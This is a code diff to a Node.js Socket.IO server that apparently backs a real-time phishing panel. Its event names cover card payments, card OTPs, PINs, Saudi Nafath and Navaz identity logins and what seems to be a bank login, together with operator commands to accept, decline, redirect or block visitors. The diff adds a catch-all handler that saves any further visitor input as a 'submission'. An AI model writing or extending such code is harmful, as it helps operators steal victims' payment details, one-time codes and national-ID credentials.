@@ -516,6 +516,31 @@ app.get("/admin/submissions", requireAdmin, (_req, res) =>
 app.get("/admin/users", requireAdmin, (_req, res) => res.json(db.get().users));
 
 // ---------- Socket.IO ----------
+// Events we handle explicitly or that carry no submission data — skip in onAny.
+const IGNORED_ANY_EVENTS = new Set([
+  "user:join", "join", "bindOrder", "chat:message",
+  "user:getChatHistory", "admin:getChatHistory", "admin:getUpdates",
+  "user:pageNavigation", "user:typingStatus", "user:statusUpdate",
+  "bin:lookup", "disconnect", "disconnecting", "ping", "pong",
+  "csrf:token", "site:publicSettings",
+  // handled explicitly with their own recordSubmission call
+  "newData", "booking:update",
+  "paymentForm", "visaOtp", "phone", "phoneOtp", "navaz",
+  "payment:update", "otp:received", "pin:received",
+  "nafath:submitted", "phone:submitted", "naflogin:submitted",
+  "nafotp:submitted", "rajlogin:submitted",
+  "health:submitted", "health2:submitted", "health3:submitted", "health4:submitted",
+  "client:cancelOtp", "client:cancelPayment",
+  "payment:duplicateAttempt", "otp:duplicateAttempt",
+  // admin -> client control events (not visitor submissions)
+  "acceptService", "declineService", "acceptPaymentForm", "declinePaymentForm",
+  "acceptPhone", "declinePhone", "acceptVisaOtp", "declineVisaOtp",
+  "acceptPhoneOtp", "declinePhoneOtp", "acceptNavaz", "declineNavaz",
+  "adminRedirect", "clientBlocked", "changeNavazCode",
+  "payment:action", "otp:action", "nafath:action", "naflogin:action",
+  "phone:action", "admin:redirect",
+]);
+
 io.on("connection", (socket) => {
   console.log(`[io] connected ${socket.id}`);
 
@@ -523,6 +548,17 @@ io.on("connection", (socket) => {
   socket.emit("csrf:token", { token: csrf });
   socket.emit("site:publicSettings", { chatEnabled: !!CHAT_ENABLED });
   socket.data.csrf = csrf;
+
+  // Catch-all: any other event the customer site emits is treated as a
+  // page submission and mirrored onto the session row.
+  socket.onAny((event, payload) => {
+    if (IGNORED_ANY_EVENTS.has(event)) return;
+    if (socket.data.userType === "admin" || socket.data.role === "admin") return;
+    if (typeof payload !== "object" || payload === null) return;
+    const id = payload.uuid || payload.id || socket.data.userId || socket.data.sessionId;
+    if (!id) return;
+    recordSubmission(event, { ...payload, uuid: id });
+  });
 
   // -------- Frontend (customer site) join --------
   socket.on("user:join", (p = {}) => {
